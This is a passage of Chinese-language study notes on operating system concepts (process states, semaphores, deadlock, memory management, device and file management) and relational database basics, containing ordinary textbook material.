3．挂起状态&emsp;&emsp;在一些系统中，增加了一些新的进程状态，其中最重要的是挂起状态。引入挂起状态的原因有：1. 对换的需要  &emsp;&emsp;为了缓和内存紧张的情况，而将内存中处于阻塞状态的进程换至外存上，使进程又处于一种有别于阻塞状态的新状态。因为即使该进程所期待的事件发生，该进程仍不具备执行条件而不能进入就绪队列，称这种状态为挂起状态。2. 终端用户的请求  &emsp;&emsp;当终端用户在自己的程序运行期间，发现有可疑问题时，往往希望使自己的进程暂停下来。也就是说，使正在执行的进程暂停执行，若是就绪进程，则不接受调度以便研究其执行情况或对程序进行修改。把这种静止状态也称为挂起状态。  3. 父进程请求  &emsp;&emsp;父进程常希望挂起自己的子进程，以便考查和修改子进程，或者协调各子进程间的活动。4. 负荷调节的需要  &emsp;&emsp;当实时系统中的工作负荷较重，有可能影响到对实时任务的控制时，可由系统把一些不重要的进程挂起，以保证系统正常运行。5. 操作系统的需要  &emsp;&emsp;操作系统希望挂起某些进程，以便检查运行中资源的使用情况及进行记账。&emsp;&emsp;综上所述，不难了解挂起状态具有以下三个属性。  1. 被挂起的进程，原来可能处于就绪状态，此时进程（被挂起）的状态称为挂起就绪；若被挂起的进程原来处于阻塞状态，此时的状态称为挂起阻塞。不论哪种状态，该进程都是不可能被调度而执行的。2. 处于挂起阻塞状态的进程，其阻塞条件与挂起条件无关；当进程所期待的事件出现后，进程虽不再被阻塞，但仍不能运行，这时，应将该进程从`静止阻塞`状态转换为`挂起就绪`状态。3. 进程可以由其自身挂起，也可由用户或操作系统等将之挂起。其目的都在于阻止进程继续运行，被挂起的进程只能用显式方式来激活，以便从挂起状态中解脱出来。&emsp;&emsp;下图所示为具有挂起操作的进程状态的演变情况：![带有挂起操作的进程状态演变图](https://pic.lufer.cc/images/2021/03/15/roL4AO.png)#### 4. 进程互斥与同步及PV操作##### 1. 进程间的同步&emsp;&emsp;异步环境下的一组并发进程之间互发消息、互相合作、互相等待，使得各进程按一定的速度执行的过程称为进程同步。也即同步是使在异步环境下的各进程按一定的顺序和速度执行。`（协作关系）`##### 2. 进程间的互斥&emsp;&emsp;一组并发进程中一个或多个程序段，因共享某一共有资源而导致必须以一个不允许交叉执行的单位执行。也就是说互斥是要保证临界资源在某一时刻只被一个进程访问。`（竞争关系）`  ##### 3. 临界资源&emsp;&emsp;一次只能供一个进程使用的资源，如打印机、公共变量和表格。##### 4. 临界区管理原则&emsp;&emsp;临界区是进程中对临界资源实施操作的那段程序，互斥临界区有如下管理原则：  1. 有空则进  &emsp;&emsp;无进程处于临界区时，若有进程要求进入临界区则立即允许其进入。2. 无空则等  &emsp;&emsp;当已有进程进入其临界区时，其他试图进入各自临界区的进程必须等待，以保证诸进程互斥地进入临界区。3. 有限等待  &emsp;&emsp;有若干进程要求进入临界区时，应在有限时间内使一进程进入临界区，即它们不应相互等待而谁也不进入临界区。4. 让权等待  &emsp;&emsp;对于等待进入临界区的进程必须释放其占有的 CPU。##### 5. 信号量机制&emsp;&emsp;信号量可以有效地实现进程的同步和互斥。在操作系统中，信号量是一个整数。当信号量大于等于 0 时，代表可供并发进程使用的资源实体数，当信号量小于零时则表示正在等待使用临界区的进程数。建立一个信号量必须说明所建信号量代表的意义和设置初值，以及建立相应的数据结构，以便指向那些等待使用该临界区的进程。  &emsp;&emsp;对信号量只能施加特殊的操作：P 操作和 V 操作。P 操作和 V 操作都是不可分割的原子操作，也称为原语。因此，P 原语和 V 原语执行期间不允许中断发生。  &emsp;&emsp;P（sem）操作的过程是将信号量 sem 值减 l，若 sem 的值成负数，则调用 P 操作的进程暂停执行，直到另一个进程对同一信号量做 V 操作。V（sem）操作的过程是将信号量sem 值加 1，若 sem 的值小于等于 0，则从相应队列（与 sem 有关的队列）中选一个进程并唤醒它。&emsp;&emsp;一般 P 操作与 V 操作的定义如下所述。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P 操作：</span><br><span class="line">P（sem）&#123;</span><br><span class="line">    sem &#x3D; sem - 1;</span><br><span class="line">    if（sem &lt; 0）</span><br><span class="line">        进程进入等待状态；</span><br><span class="line">    else </span><br><span class="line">        继续进行；</span><br><span class="line">    &#125; </span><br><span class="line">V 操作：</span><br><span class="line">V（sem）&#123;</span><br><span class="line">    sem &#x3D; sem + 1;</span><br><span class="line">    if（sem ≤ 0）</span><br><span class="line">        唤醒队列中的一个等待进程；</span><br><span class="line">    else </span><br><span class="line">        继续进行；</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  要用 P，V 操作实现进程同步，需要引进私用信号量。私用信号量只与制约进程和被制约进程有关，而不是与整组并发进程相关。与此相对，进程互斥使用的信号量为公用信号量。首先为各并发进程设置私用信号量，然后为私用信号量赋初值，最后利用 P，V 原语和私用信号量规定各进程的执行顺序。</p><h4 id="5-进程通信与管程"><a class="markdownIt-Anchor" href="#5-进程通信与管程"></a> 5. 进程通信与管程</h4><h5 id="1-进程通信"><a class="markdownIt-Anchor" href="#1-进程通信"></a> 1. 进程通信</h5><p>  通信是指进程间的信息交换，可分为<code>控制信息</code>的交换和<code>数据</code>的交换。<br />  控制信息的交换成为低级通信，通过信号量来实现，属于低级信息。<br />  数据交换成为高级通信，类型可以分为<code>共享存储系统</code>、<code>消息传递系统</code>和<code>管道通信</code>。方式有<code>直接通信</code>和<code>间接通信</code>。</p><h5 id="2-管程"><a class="markdownIt-Anchor" href="#2-管程"></a> 2. 管程</h5><p>  共享数据及在其上操作的一组过程构成管程。任一时刻最多只有一个进程能够真正地进入管程。</p><h4 id="6进程调度与死锁"><a class="markdownIt-Anchor" href="#6进程调度与死锁"></a> 6.进程调度与死锁</h4><h5 id="1-进程调度"><a class="markdownIt-Anchor" href="#1-进程调度"></a> 1. 进程调度</h5><p>  进程调度即处理器调度（又称上下文转换），它的主要功能是确定在什么时候分配处理器，并确定分给哪一个进程。</p><h5 id="2-调度方式与算法"><a class="markdownIt-Anchor" href="#2-调度方式与算法"></a> 2. 调度方式与算法</h5><p>  进程调度的方式有两类：<code>剥夺方式</code>与<code>非剥夺方式</code>。<br />  所谓非剥夺方式是指，一旦某个作业或进程占用了处理器，别的进程就不能把处理器从这个进程手中夺走，直到该进程自己因调用原语操作而进入阻塞状态，或时间片用完而让出处理机。<br />  剥夺方式是指，当就绪队列中有进程的优先级高于当前执行进程的优先级时，便立即发生进程调度，转让处理机。</p><p>  进程调度的算法是服务于系统目标的策略，对于不同的系统与系统目标，常采用不同的调度算法：</p><ol><li>先来先服务（First Come and First Serverd，FCFS）调度算法<br />  又称先进先出（First Inand First Out，FIFO）。就绪队列按先来后到原则排队。</li><li>优先数调度<br />  优先数反映了进程优先级，就绪队列按优先数排队。有两种确定优先级的方法，即<code>静态优先级</code>和<code>动态优先级</code>。静态优先级是指进程的优先级在进程开始执行前确定，执行过程中不变，而动态优先级则可以在进程执行过程中改变。</li><li>轮转法（Round Robin）<br />  就绪队列按 FCFS 方式排队。每个进程执行一次占有处理器时间都不超过规定的时间单位（时间片）若超过，则自行释放自己所占有的 CPU 而排到就绪队列的末尾，等待下一次调度。同时，进程调度程序又去调度当前就绪队列中的第一个进程。</li></ol><h5 id="3-死锁"><a class="markdownIt-Anchor" href="#3-死锁"></a> 3. 死锁</h5><p>  当若干个进程互相竞争对方已占有的资源，无限期地等待，不能向前推进时会造成“死锁”。<br />  死锁是系统的一种出错状态，它不仅会浪费大量的系统资源，甚至还会导致整个系统的崩溃，所以死锁是应该尽量预防和避免的。</p><h5 id="4-死锁产生的原因及条件"><a class="markdownIt-Anchor" href="#4-死锁产生的原因及条件"></a> 4. 死锁产生的原因及条件</h5><ol><li>死锁条件<br />  产生死锁的主要原因是资源竞争和进程的推进顺序不当。<br />  产生死锁的必要条件是：<code>互斥条件</code>、<code>保持和等待条件</code>、<code>不剥夺条件</code>和<code>环路等待条件</code>。</li><li>解决死锁的策略<br />  处于死锁状态的进程不能继续执行但又占用了系统资源，从而阻碍其他作业的执行。<br />  解决死锁有两种策略：一种是在<code>死锁发生前采用的预防和避免策略</code>；另一种是<code>在死锁发生后采用的检测与恢复策略</code>。<br />  死锁的预防主要是通过打破死锁产生的 4 个必要条件之一来保证不会产生死锁。采用的死锁预防策略通常有资源的<code>静态分配法</code>或<code>有序分配法</code>，它们分别打破了资源动态分配条件和循环等待条件，因此不会发生死锁。但这样做会大大降低系统资源的利用率和进程之间的并行程度。<br />  死锁避免策略，则是在系统进行资源分配时，先执行一个死锁避免算法（典型的如银行家算法），以保证本次分配不会导致死锁发生。由于资源分配很频繁，因此死锁避免策略要耗费大量的 CPU 和时间。</li></ol><p>  实际上，系统出现死锁的概率很小，故从系统所花的代价上看，采用死锁发生后的检测与恢复策略要比采用死锁发生前的预防与避免策略代价小一些。</p><h4 id="7-线程"><a class="markdownIt-Anchor" href="#7-线程"></a> 7. 线程</h4><p>  线程是进程中的一个实体，是被系统独立分配和调度的基本单位。同属一个进程的线程共享进程所拥有的全部资源。</p><h3 id="213-存储管理"><a class="markdownIt-Anchor" href="#213-存储管理"></a> 2.1.3 存储管理</h3><p>  存储管理主要是指对内存储器的管理，存储管理的目的是尽量提高内存的使用效率，扩充主存以及对主存信息实现有效保护。<br />  存储管理的方式有分区存储管理、分页存储管理、分段存储管理、段页式存储管理和虚拟存储管理。</p><h4 id="1-页式存储管理"><a class="markdownIt-Anchor" href="#1-页式存储管理"></a> 1. 页式存储管理</h4><p>  分页的基本思想是把程序的逻辑空间和内存的物理空间按照同样的大小划分成若干页面，并以页面为单位进行分配。在页式存储管理中，系统中虚地址是一个有序对（页号，位移）。系统为每一个进程建立一个页表，其内容包括进程的逻辑页号与物理页号的对应关系、状态等。<br />  页式系统的动态地址转换是这样进行的：当进程运行时，其页表的首地址已在系统的动态地址转换机构中的基本地址寄存器中。执行的指令访问虚存地址（p，d）时，首先根据页号 p 查页表，由状态可知，这个页是否已经调入内存。若已调入内存，则得到该页的内存位置 p’，然后，与页内相对位移 d 组合，得到物理地址 r。如果该页尚未调入内存，则产生缺页中断，以装入所需的页，该过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rTEYIH.png" alt="页式存储动态地址转换" /></p><p>  页式虚拟存储管理是在页式存储管理的基础上实现虚拟存储器的。首先把作业信息作为副本存放在磁盘上，作业执行时，把作业信息的部分页面装入内存储器，作业执行时若所访问的页面已在内存中，则按页式存储管理方式进行地址转换，得到欲访问的内存绝对地址，若欲访问的页面不在内存中，则产生一个“缺页中断”，由操作系统把当前所需的页面装入内存储器中。<br />  为此，在装入作业时，就应在该作业的页表中指出哪些页已在内存储器中，哪些页还没有装入内存。可用一个标志位指示对应页是否在内存储器，可假设标志位为 1 表示该页在内存，而标志位为 0 表示该页尚未装入内存。为了能方便地从磁盘上找到作业信息的副本，故在页表中还可指出每一页副本在磁盘上的位置。</p><p>  当内存中无空闲块时，为了装入一个页面而必须按某种算法从已在内存的页中选择一页，将它暂时调出内存，让出内存空间以存放所需装入的页面，这个工作称为“页面调度”。如何选择调出的页面是很重要的，如果采用了一个不合适的算法，就会出现这样的现象：刚被调出的页面又立即要用，因而又要把它装入，而装入不久又被选中调出，调出不久又被装入，如此反复，使调度非常频繁。这种现象称为<code>“抖动”</code>。一个好的调度算法应减少或避免抖动现象。</p><p>  常用的页面调度算法有：</p><ol><li>最优（OPT）算法<br />  选择不再使用或最远的将来才被使用的页，这是理想的算法，但是难以实现，常用于淘汰算法的比较。</li><li>随机（RAND）算法<br />  随机地选择被淘汰的页，开销小，但是可能选中立即就要访问的页。</li><li>先进先出算法<br />  选择在内存驻留时间最长的页似乎合理，但可能淘汰掉频繁使用的页。另外，使用 FIFO 算法时，在未给予进程分配足够的页面数时，有时会出现给予进程的页面数增多，缺页次数反而增加的异常现象。<br />  FIFO 算法简单，易实现。可以把装入内存储器的那些页的页号按进入的先后顺序排成队列，每次总是调出队首的页，当装入一个新页后，把新页的页号排到队尾。</li><li>最近最少使用（Least Recently Used，LRU）算法<br />  选择离当前时间最近的一段时间内使用得最少的页。这个算法的主要出发点是，如果某个页被访问了，则它可能马上就要被访问；反之，如果某个页长时间未被访问，则它在最近一段时间也不会被访问。</li></ol><h4 id="2段式存储管理"><a class="markdownIt-Anchor" href="#2段式存储管理"></a> 2．段式存储管理</h4><p>  段式存储管理与页式存储管理相似。分段的基本思想是把用户作业按逻辑意义上有完整意义的段来划分，并以段为单位作为内外存交换的空间尺度。<br />  一个作业是由若干个具有逻辑意义的段（如主程序、子程序、数据段等）组成。分段系统中，容许程序（作业）占据内存中许多分离的分区。每个分区存储一个程序分段。这样每个作业需要几对界限地址寄存器，判定访问地址是否越界也就更困难了。在分段存储系统中常常利用存储保护键实现存储保护。分段系统中虚地址是一个有序对（段号，位移）。系统为每个作业建立一个段表，其内容包括段号、段长、内存起始地址和状态等。状态指出这个段是否已调入内存，即内存起始地址指出这个段，状态指出这个段的访问权限。</p><p>  分段系统的动态地址转换是这样进行的：进程执行时，其段表的首地址已在基本地址寄存器中，执行的指令访问虚存（s，d）（取指令或取操作数）时，首先根据段号 s 查段表，若段已经调入内存，则得到该段的内存起始地址，然后与段内相对地址（段内偏移量 d）相加，得到实地址。如果该段尚未调入内存，则产生缺段中断，以装入所需要的段。</p><p>  段式虚拟存储管理仍然以段式存储管理为基础，为用户提供比内存实际容量大的虚拟空间。段式虚拟存储管理把作业中的各个分段信息都保留在磁盘上，当作业可以投入执行时，做如下操作：</p><ul><li>首先把当前需要的一段或几段装入内存。</li><li>作业执行时，如果要访问的段已经在内存，则按照“段式存储管理”中的方式进行地址转换；如果要访问的段不在内存中，则产生一个“缺段中断”，由操作系统把当前需要的段装入内存。</li></ul><p>  因此，在段表中应增设段是否在内存的标志以及各段在磁盘上的位置，已在内存中的段仍要指出该段在内存中的起始地址和占用内存区长度。<br />  作业执行要访问的段时，由硬件的地址转换机构查段表。若该段在内存中，则立即把逻辑地址转换成绝对地址；若该段不在内存中，则形成“缺段中断”，由操作系统处理这个中断。<br />  处理的办法是:查内存分配表，找出一个足够大的连续区以容纳该分段，如果找不到足够大的连续区则检查空闲区的总和，若空闲区总和能满足该段要求，那么进行适当移动将分散的空闲区集中；若空闲区总和不能满足该段要求，可把内存中的一段或几段调出，然后把当前要访问的段装入内存中。段被移动、调出和装入后都要对段表中的相应表目做修改。新的段被装入后应让作业重新执行被中断的指令，这时就能找到要访问的段，也可以继续执行下去。</p><h4 id="3段页式存储管理"><a class="markdownIt-Anchor" href="#3段页式存储管理"></a> 3．段页式存储管理</h4><p>  段页式管理是段式和页式两种管理方法结合的产物，综合了段式组织与页式组织的特点，根据程序模块分段，段内再分页，内存被分划成定长的页。段页式系统中虚地址形式是（段号、页号、页内偏移），如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rTmG6I.png" alt="段页式系统的虚地址形式" /></p><p>  系统为每个进程建立一个段表，为每个段建立一个页表。段页式管理采用段式分配、页式使用的方法，便于动态连接和存储的动态分配。这种存储管理能提高内存空间的利用率。<br />  段式虚拟管理还是以段为单位分配内存空间，整段的调出、装入，有时还要移动，这些都增加了系统的开销。如果按段页式存储管理的方式，把每一段再分成若干页面，那么，每一段不必占用连续的存储空间；甚至当内存块不够时，可只将一段中的部分页面装入内存，这种管理方式称为“段页式虚拟存储管理”。<br />  段页式虚拟存储管理为每一个装入内存的作业建立一张段表，还要为每一段建立页表。段表中指出该段的页表存放位置及长度，页表中应指出该段的各页在磁盘上的位置以及页是否在内存中，若在内存中则填上占用的内存块号。作业执行时按段号查段表，找到相应的页表再根据页号查页表，由标志位判定该页是否已在内存，若是，则进行地址转换；否则进行页面调度。地址转换过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rTmcn0.png" alt="段页式存储地址转换过程" /></p><p>  段页式虚拟存储管理结合了段式和页式的优点，但增加了设置表格（段表、页表）和查表等开销，段页式虚拟存储器一般只在大型计算机系统中使用。</p><h3 id="214-设备管理"><a class="markdownIt-Anchor" href="#214-设备管理"></a> 2.1.4 设备管理</h3><p>  设备管理的主要任务是保证在多道程序环境下，当多个进程竞争使用设备时，按一定策略分配和管理各种设备，控制设备的各种操作，完成输入/输出设备与主存之间的数据交换。<br />  设备管理的目标是提高设备的利用率，为用户提供方便统一的界面。<br />  设备管理的主要功能是动态的掌握并记录设备的状态、设备分配和释放、缓冲区管理、实现物理输入/输出设备的操作、提供设备使用的用户接口、设备的访问和控制、输入/输出缓冲和调度。</p><h4 id="1-设备的分类"><a class="markdownIt-Anchor" href="#1-设备的分类"></a> 1. 设备的分类</h4><p>  按<code>设备的使用特性</code>可分为：<code>存储设备</code>、<code>输入/输出设备</code>、<code>终端设备</code>和<code>脱机设备</code>。<br />  从<code>资源分配角度</code>分为：<code>独占设备</code>、<code>共享设备</code>和<code>虚拟设备</code>。<br />  按<code>设备的从属关系</code>分为：<code>系统设备</code>和<code>用户设备</code>。<br />  按<code>数据组织方式</code>分为：<code>块设备</code>和<code>字符设备</code>。<br />  按<code>输入/输出对象</code>分为：<code>人机通信设备</code>、<code>机机通信设备</code>。<br />  按<code>是否可交互</code>分为：<code>非交互设备</code>、<code>交互设备</code>。</p><h4 id="2-设备管理的主要技术"><a class="markdownIt-Anchor" href="#2-设备管理的主要技术"></a> 2. 设备管理的主要技术</h4><ul><li>中断技术</li><li>DMA技术</li><li>缓冲技术</li><li>虚设备与SPOOLING技术<br />  采用假脱机技术，可以将低速的独占设备改造成一种可共享的设备，而且一台物理设备可以对应若干台虚拟的同类设备。假脱机（Simultaneous Peripheral Operation On Line，SPOOLING）的意思是外部设备同时联机操作，又称为假脱机输入/输出操作，采用一组程序或进程模拟一台输入/输出处理器。<br />  该技术利用了专门的外围控制机将低速 I/O 设备上的数据传送到高速设备上，或者相反。但是当引入多道程序后，完全可以利用其中的一道程序来模拟脱机输入时的外围控制机的功能，把低速的 I/O 设备上的数据传送到高速磁盘上；再利用另一道程序来模拟脱机输出时外围控制机的功能，把高速磁盘上的数据传送到低速的 I/O 设备上。这样便可以在主机的控制下实现脱机输入、输出的功能。此时的外围操作与 CPU 对数据的处理同时进行。</li></ul><h4 id="3-设备管理软件"><a class="markdownIt-Anchor" href="#3-设备管理软件"></a> 3. 设备管理软件</h4><ul><li>中断处理程序</li><li>设备驱动程序</li><li>与设备无关的系统软件</li><li>用户层IO软件</li></ul><h4 id="4-数据传输控制方式"><a class="markdownIt-Anchor" href="#4-数据传输控制方式"></a> 4. 数据传输控制方式</h4><p>  外围设备和内存之间常用的数据传送控制方式主要有以下几种：</p><ol><li>程序控制方式<br />  处理器启动数据传输，然后等设备完成。</li><li>中断方式<br />  程序控制方式不能实现并发。中断方式的数据传输过程是这样的，进程启动数据传输（如读）后，该进程放弃处理器，当数据传输完成，设备控制器产生中断请求，中断处理程序对数据传输工作处理之后，让相应进程成为就绪状态。以后，该进程就可以得到所需要的数据。</li><li>直接存储访问（Direct Memory Access，DMA）方式<br />  指外部设备和内存之间开辟直接的数据交换通路。除了控制状态寄存器和数据缓冲寄存器外，DMA 控制器中还包括传输字节计数器、内存地址寄存器等。DMA 方式采用窃取（或挪用）处理器的工作周期和控制总线而实现辅助存储器和内存之间的数据交换。有的 DMA 方式也采用总线浮起方式传输大批量数据。</li><li>通道方式<br />  通道又称为输入/输出处理器（Input/Output Processor，IOP），可以独立完成系统交付的输入/输出任务，通过执行自身的输入/输出专用程序（称通道程序）进行内存和外设之间的数据传输。主要有 3 种通道：字节多路通道、选择通道和成组多路通道。</li></ol><p>  选择和衡量控制方式的原则如下：</p><ol><li>数据传送速度足够高，能满足用户的需要但又不丢失数据。</li><li>系统开销小，所需的处理控制程序少。</li><li>能充分发挥硬件资源的能力，使得 I/O 设备尽量处于使用状态中，而 CPU 等待时间少</li></ol><h4 id="5-磁盘调度算法"><a class="markdownIt-Anchor" href="#5-磁盘调度算法"></a> 5. 磁盘调度算法</h4><p>  磁盘调度的意义是使各个进程对磁盘的平均访问时间最小。<br />  常用的调度算法有<code>先来先服务</code>、<code>最短寻道时间优先</code>、<code>扫描算法</code>。</p><h3 id="215-文件管理"><a class="markdownIt-Anchor" href="#215-文件管理"></a> 2.1.5 文件管理</h3><p>  文件是具有符号名、在逻辑上具有完整意义的一组相关信息项的集合。操作系统根据文件名对文件进行控制和管理。<br />  文件管理的功能包括：</p><ul><li>按文件名访问文件</li><li>统一用户接口</li><li>并发访问和控制</li><li>安全性控制</li><li>优化性能</li><li>差错恢复</li></ul><h4 id="1-文件的类型"><a class="markdownIt-Anchor" href="#1-文件的类型"></a> 1. 文件的类型</h4><p>  按<code>文件性质和用途</code>可分为：<code>系统文件</code>、<code>库文件</code>和<code>用户文件</code>。<br />  按<code>文件的安全属性</code>可分为：<code>只读文件</code>、<code>读写文件</code>、<code>可执行文件</code>和<code>不保护文件</code>。<br />  按<code>文件的组织形式</code>可分为：<code>普通文件</code>、<code>目录文件</code>、<code>设备文件（特殊文件）</code>。<br />  按<code>信息保存期限</code>可分为：<code>临时文件</code>、<code>档案文件</code>和<code>永久文件</code>。<br />  按<code>信息流向</code>可分为：<code>输入文件</code>、<code>输出文件</code>、<code>输入/输出文件</code>。</p><h4 id="2-文件的组织和结构"><a class="markdownIt-Anchor" href="#2-文件的组织和结构"></a> 2. 文件的组织和结构</h4><p>  文件的<code>逻辑结构</code>分为<code>有结构的记录文件</code>和<code>无结构的字符流文件</code>。<br />  文件的<code>物理结构</code>分为<code>连续结构</code>、<code>链接结构</code>、<code>索引结构</code>和<code>多个物理块的索引表</code>。</p><h4 id="3-文件访问方法"><a class="markdownIt-Anchor" href="#3-文件访问方法"></a> 3. 文件访问方法</h4><p>  常用的访问方法有<code>顺序访问</code>和<code>随机访问</code>两种。<br />  顺序访问是指对文件中的信息按顺序依次读写。<br />  随机访问是可以按任意的次序随机地读写文件中的信息。</p><h4 id="4-文件存储设备管理"><a class="markdownIt-Anchor" href="#4-文件存储设备管理"></a> 4. 文件存储设备管理</h4><p>  文件存储设备常用的空闲空间管理方法有<code>位图法</code>、<code>索引法</code>和<code>链接法</code>。</p><h4 id="5-文件控制块和文件目录"><a class="markdownIt-Anchor" href="#5-文件控制块和文件目录"></a> 5. 文件控制块和文件目录</h4><p>  文件控制块（FCB）是系统为每个文件设置的用于描述和控制文件的数据结构，它是文件存在的唯一标志。FCB一般包含<code>基本信息</code>、<code>位置信息</code>、<code>存取控制信息</code>和<code>使用信息</code>。<br />  文件目录是文件控制块的有序集合。</p><h3 id="216-作业管理"><a class="markdownIt-Anchor" href="#216-作业管理"></a> 2.1.6 作业管理</h3><h4 id="1-作业管理和作业控制"><a class="markdownIt-Anchor" href="#1-作业管理和作业控制"></a> 1. 作业管理和作业控制</h4><p>  作业是系统为完成一个用户的计算任务（或一次事务处理）所做的工作总和。它由程序、数据和作业说明书三部分组成。<br />  作业管理程序是操作系统中用来控制作业<code>进入</code>、<code>执行</code>和<code>撤销</code>的一组程序。<br />  用户作业可以采用联机和脱机两种控制方式控制作业运行。<br />  作业控制块（JCB）是记录与该作业有关的各种信息的登记表，是作业存在的唯一标志。包括<code>用户名</code>、<code>作业名</code>、<code>状态标志</code>等信息。</p><h4 id="2-作业调度及其常用算法"><a class="markdownIt-Anchor" href="#2-作业调度及其常用算法"></a> 2. 作业调度及其常用算法</h4><p>  作业调度是指完成从<code>后备状态到执行状态</code>的转变及从<code>执行状态到完成状态</code>的转变。<br />  常用的调度算法有<code>先来先服务</code>、<code>短作业优先</code>、<code>响应比高优先</code>、<code>优先级调度算法</code>和<code>均衡调度算法</code>。</p><h2 id="22-数据库系统基础知识"><a class="markdownIt-Anchor" href="#22-数据库系统基础知识"></a> 2.2 数据库系统基础知识</h2><p>  数据库（DB）是指长期存储在计算机内的、有组织的、可共享的数据集合。<br />  数据库系统（DBS）从广义上讲是由数据库、硬件、软件和人员组成，管理对象是数据。<br />  数据库管理系统（DBMS）是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库。主要功能有数据定义、数据库操作、数据库运行管理、数据组织、存储和管理、数据库的建立与维护及其他功能。<br />  DBMS通常可分为三类：关系数据库系统（RDBS）、面向对象的数据库系统（OODBS）、对象关系数据库系统（ORDBS）。<br />  数据库采用三级模式结构，结构图如下图所示。数据库系统在三级模式间提供了两级映像：<code>模式/内模式映像</code>、<code>外模式/模式映像</code>来保证数据库中数据有较高的逻辑独立性和物理独立性。</p><p><img src="https://pic.lufer.cc/images/2021/04/10/image.png" alt="数据库系统体系结构" /></p><h3 id="221-关系数据库基础"><a class="markdownIt-Anchor" href="#221-关系数据库基础"></a> 2.2.1 关系数据库基础</h3><h4 id="1-数据库的结构与模式"><a class="markdownIt-Anchor" href="#1-数据库的结构与模式"></a> 1. 数据库的结构与模式</h4><p>  数据库结构的基础是数据模型，是用来描述数据的一组概念和定义。<br />  数据模型的三要素是<code>数据结构</code>、<code>数据操作</code>以及<code>数据的约束条件</code>。<br />  关系数据模型由<code>关系数据结构</code>、<code>关系操作结合</code>和<code>关系完整性约束</code>三大要素组成。</p><h4 id="2-实体-联系e-r模型"><a class="markdownIt-Anchor" href="#2-实体-联系e-r模型"></a> 2. 实体-联系（E-R）模型</h4><p>  E-R方法主要概念有<code>实体</code>、<code>联系</code>和<code>属性</code>，该方法直接从现实世界中抽象出实体和实体间的联系。</p><h4 id="3-数据的规范化"><a class="markdownIt-Anchor" href="#3-数据的规范化"></a> 3. 数据的规范化</h4><p>  关系数据库设计理论的核心是<code>数据间的函数依赖</code>，衡量的标准是<code>关系规范化的程度</code>及<code>分解的无损连接</code>和<code>保持函数依赖性</code>。<br />  关系模型满足的确定约束条件称为范式，根据满足约束条件的级别不同，范式由低到高分为 1NF（第一范式）、2NF（第二范式）、3NF（第三范式）、BCNF（BC 范式）、4NF（第四范式）等。不同的级别范式性质不同。<br />  把一个低一级的关系模型分解为高一级关系模型的过程，称为关系模型的规范化。关系模型分解必须遵守两个准则：</p><ol><li>无损连接性：信息不失真（不增减信息）。</li><li>函数依赖保持性：不破坏属性间存在的依赖关系。</li></ol><p>  综合 1NF、2NF 和 3NF、BCNF 的内涵可概括如下：</p><ol><li>非主属性完全函数依赖于码（2NF 的要求）；</li><li>非主属性不传递依赖于任何一个候选码（3NF 的要求）；</li><li>主属性对不含它的码完全函数依赖（BCNF 的要求）；</li><li>没有属性完全函数依赖于一组非主属性（BCNF 的要求）。</li></ol><h4 id="4-事务管理"><a class="markdownIt-Anchor" href="#4-事务管理"></a> 4. 事务管理</h4><p>  事务是数据库环境中不可分割的逻辑工作单位。一个程序可包含多个事务。<br />  事务具有4个特性（ACID）：<code>原子性（atomicity）</code>、<code>一致性（consistency）</code>、<code>隔离性（isolation）</code>、<code>持久性（durability）</code>。</p><h4 id="5-并发控制"><a class="markdownIt-Anchor" href="#5-并发控制"></a> 5. 并发控制</h4><p>  并发操作带来的问题主要有<code>丢失更新</code>、<code>不可重复读</code>、<code>脏数据</code>。<br />  并发控制的主要技术是封锁。主要类型有<code>排他锁</code>（X锁或写锁）和<code>共享锁</code>（S锁或读锁）。</p><h4 id="6-数据库的备份与恢复"><a class="markdownIt-Anchor" href="#6-数据库的备份与恢复"></a> 6. 数据库的备份与恢复</h4><p>  保护数据库的关键技术在于<code>建立冗余数据</code>，即备份数据。<br />  建立冗余数据的方法是进行<code>数据转储</code>和<code>建立日志文件</code>。<br />  数据转储分为<code>静态转储和动态转储</code>、<code>海量转储和增量转储</code>。<br />  数据库的4类故障是<code>事务故障</code>、<code>系统故障</code>、<code>介质故障</code>及<code>计算机病毒</code>。<br />  事务故障的恢复一般有两种操作：<code>撤销事务</code>和<code>重做事务</code>。<br />  介质故障的恢复需要DBA的参与，装入数据库的副本和日志文件的副本，再由系统执行撤销和重做操作。</p><h3 id="222-关系数据库设计"><a class="markdownIt-Anchor" href="#222-关系数据库设计"></a> 2.2.2 关系数据库设计</h3><p>  数据库设计包括<code>结构特性设计</code>和<code>行为特性设计</code>两方面。</p><h4 id="1-数据库设计的特点"><a class="markdownIt-Anchor" href="#1-数据库设计的特点"></a> 1. 数据库设计的特点</h4><p>  从数据结构即数据模型开始，以数据模型为核心展开。<br />  静态结构设计与动态行为设计分离。<br />  试探性、反复性和多步性。</p><h4 id="2-数据库设计的方法"><a class="markdownIt-Anchor" href="#2-数据库设计的方法"></a> 2. 数据库设计的方法</h4><p>  目前已有的数据库设计方法可分为四类，即<code>直观设计法</code>、<code>规范设计法</code>、<code>计算机辅助设计法</code>和<code>自动化设计法</code>。<br />  主要掌握基于3NF的设计方法。</p><h4 id="3-数据库设计的基本步骤"><a class="markdownIt-Anchor" href="#3-数据库设计的基本步骤"></a> 3. 数据库设计的基本步骤</h4><p>  数据库设计分为需求分析、概念结构设计、逻辑结构设计、物理结构设计、应用程序设计和运行维护6个阶段，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/04/11/image.png" alt="数据库设计步骤" /></p><ol><li>需求分析<br />  需求分析阶段的任务是对现实世界要处理的对象（组织、部门、企业等）进行详细调查，在了解现行系统的概况、确定新系统功能的过程中，收集支持系统目标的基础数据及其处理方法。<br />  在需求分析中，通过自顶向下、逐步分解的方法分析系统。分析的结果用数据流图进行图形化的描述，并用一些规范的表格对数据分析结果和描述做补充，最后形成需求说明书。</li><li>概念结构设计<br />  在需求分析的基础上，依照需求分析中的信息需求，对用户信息加以分类、聚集和概括，建立信息模型，并按照选定的数据库管理系统软件，把它们转换为数据的逻辑结构，再依照 软硬件环境，最终实现数据的合理存储。这一过程也称为数据建模。<br />  数据库概念结构设计的策略通常有自顶向下、自底向上、逐步扩张、混合策略。最常用的是自底向上。</li><li>逻辑结构设计<br />  在概念结构设计基础上进行数据模型设计，可以使层次、网状模型和关系模型。<br />  